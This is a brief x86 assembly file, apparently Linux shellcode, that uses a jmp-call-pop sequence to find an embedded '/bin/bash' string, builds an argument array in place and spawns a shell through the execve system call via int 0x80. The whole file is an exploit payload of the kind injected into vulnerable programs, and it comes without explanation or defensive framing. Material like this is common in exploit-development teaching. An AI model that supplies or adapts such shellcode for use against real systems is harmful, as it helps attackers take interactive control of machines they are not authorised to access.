;execve('/bin/bash', ['/bin/bash', NULL], NULL)

global _start

_start:
	jmp stage_1


stage_2:
	pop esi
	xor eax, eax
	mov BYTE [esi + 9], al
	mov DWORD [esi + 10], esi
	mov DWORD [esi + 14], eax

	lea ebx, [esi]
	lea ecx, [esi + 10]
	lea edx, [esi + 14]
	mov al, 11
		
	int 0x80


stage_1:
	call stage_2
	shell: db "/bin/bash"
